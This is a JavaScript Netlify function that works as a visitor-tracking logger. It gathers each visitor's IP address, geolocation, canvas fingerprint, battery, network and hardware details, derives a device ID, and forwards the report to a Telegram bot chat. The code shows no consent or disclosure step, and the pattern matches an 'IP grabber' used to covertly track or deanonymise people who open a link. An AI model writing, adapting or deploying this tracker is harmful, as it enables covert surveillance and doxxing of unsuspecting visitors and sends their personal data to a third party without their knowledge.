// netlify/functions/track.js
// Netlify Function: collects client info and forwards it to Telegram.
// Environment variables required: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function simpleHash(str) {
  str = String(str || "");
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = (hash << 5) - hash + str.charCodeAt(i);
    hash |= 0;
  }
  return hash.toString(16);
}

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ ok: false, error: "Method not allowed" }),
      headers: { "Content-Type": "application/json" },
    };
  }

  try {
    const bodyStr = event.body || "";
    let js = {};
    try {
      js = bodyStr ? JSON.parse(bodyStr) : {};
    } catch {
      js = {};
    }

    const now = new Date().toISOString();
    const headers = event.headers || {};

    let ipHeader =
      headers["x-forwarded-for"] ||
      headers["x-real-ip"] ||
      headers["client-ip"] ||
      null;
    let ip = Array.isArray(ipHeader) ? ipHeader[0] : ipHeader;
    if (ip && ip.includes(",")) ip = ip.split(",")[0].trim();

    const forwardedIp = headers["x-forwarded-for"] || null;
    const userAgent = headers["user-agent"] || "";
    const langHeader = headers["accept-language"] || "";
    const referer = headers["referer"] || headers["referrer"] || "";

    const isMobile = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
      userAgent
    )
      ? "Yes"
      : "No";

    const screen_w = js.screen_width ?? "N/A";
    const screen_h = js.screen_height ?? "N/A";
    const avail_w = js.avail_width ?? "N/A";
    const avail_h = js.avail_height ?? "N/A";
    const pixel_ratio = js.pixel_ratio ?? "N/A";

    const timezone_js = js.timezone ?? "N/A";
    const platform_js = js.platform ?? "N/A";
    const vendor_js = js.vendor ?? "N/A";
    const lang_js = js.language ?? "N/A";
    const languages_js = js.languages ?? [];
    const hw_threads = js.hardwareConcurrency ?? "N/A";
    const device_mem = js.deviceMemory ?? "N/A";
    const max_touch_points = js.max_touch_points ?? "N/A";
    const orientation = js.orientation ?? "N/A";
    const ua_js = js.ua ?? "";

    const geolocation = js.geolocation ?? "N/A";
    const canvas_fp = js.canvas_fp ?? "";
    const latency_probe_ms = js.latency_probe_ms ?? "N/A";
    const battery = js.battery ?? {};
    const battery_level =
      typeof battery.level === "number" ? `${battery.level}%` : "N/A";
    const battery_charging =
      typeof battery.charging === "boolean"
        ? battery.charging
          ? "Yes"
          : "No"
        : "N/A";

    const connection = js.connection ?? {};
    const net_type = connection.effectiveType ?? "N/A";
    const net_downlink = connection.downlink ?? "N/A";
    const net_rtt = connection.rtt ?? "N/A";
    const net_saveData =
      typeof connection.saveData === "boolean"
        ? connection.saveData
          ? "Yes"
          : "No"
        : "N/A";

    const ua_model = js.ua_model ?? "N/A";
    const languages_str = Array.isArray(languages_js)
      ? languages_js.join(", ")
      : String(languages_js);

    const device_id = simpleHash(
      [
        userAgent,
        `${screen_w}x${screen_h}`,
        timezone_js,
        (canvas_fp || "").slice(0, 64),
        ua_model,
      ].join("|")
    );

    const device_mem_str =
      device_mem !== "N/A" && typeof device_mem === "number"
        ? `${device_mem} GB`
        : String(device_mem);

    let msg = `New visit\n\n`;
    msg += `Time: ${now}\n\n`;

    msg += `IP info:\n`;
    msg += `- IP: ${ip || "N/A"}\n`;
    msg += `- X-Forwarded-For: ${forwardedIp || "N/A"}\n\n`;

    msg += `Device:\n`;
    msg += `- Mobile: ${isMobile}\n`;
    msg += `- Platform (JS): ${platform_js}\n`;
    msg += `- Vendor: ${vendor_js}\n`;
    msg += `- Model (UA hints): ${ua_model}\n`;
    msg += `- CPU cores: ${hw_threads}\n`;
    msg += `- RAM: ${device_mem_str}\n`;
    msg += `- Touch points: ${max_touch_points}\n`;
    msg += `- Orientation: ${orientation}\n`;
    msg += `- Battery: ${battery_level} (Charging: ${battery_charging})\n`;
    msg += `- Device ID: ${device_id}\n\n`;

    msg += `Network:\n`;
    msg += `- Type: ${net_type}\n`;
    msg += `- Downlink: ${net_downlink} Mbps\n`;
    msg += `- RTT: ${net_rtt} ms\n`;
    msg += `- Data saver: ${net_saveData}\n\n`;

    msg += `Screen:\n`;
    msg += `- Resolution: ${screen_w} x ${screen_h}\n`;
    msg += `- Available: ${avail_w} x ${avail_h}\n`;
    msg += `- Pixel ratio: ${pixel_ratio}\n\n`;

    msg += `Languages:\n`;
    msg += `- Header: ${langHeader}\n`;
    msg += `- JS language: ${lang_js}\n`;
    msg += `- JS languages: ${languages_str}\n\n`;

    msg += `Session:\n`;
    msg += `- Timezone: ${timezone_js}\n`;
    msg += `- Latency probe: ${latency_probe_ms} ms\n\n`;

    msg += `Location:\n`;
    msg += `- Geo: ${geolocation}\n\n`;

    msg += `User-Agent:\n${userAgent}\n`;
    if (ua_js) msg += `UA (JS): ${ua_js}\n`;
    msg += `Referer: ${referer || "N/A"}`;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      const missing = [];
      if (!TELEGRAM_BOT_TOKEN) missing.push("TELEGRAM_BOT_TOKEN");
      if (!TELEGRAM_CHAT_ID) missing.push("TELEGRAM_CHAT_ID");
      return {
        statusCode: 500,
        body: JSON.stringify({
          ok: false,
          error: `Missing env vars: ${missing.join(", ")}`,
        }),
        headers: { "Content-Type": "application/json" },
      };
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
      const tgRes = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
        }),
      });
      if (!tgRes.ok) {
        const bodyText = await tgRes.text();
        console.error("Telegram response error:", tgRes.status, bodyText);
      }
    } catch (e) {
      console.error("Telegram fetch error:", e);
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ ok: true }),
      headers: { "Content-Type": "application/json" },
    };
  } catch (err) {
    console.error("Server error:", err);
    return {
      statusCode: 500,
      body: JSON.stringify({ ok: false, error: "Server error" }),
      headers: { "Content-Type": "application/json" },
    };
  }
};
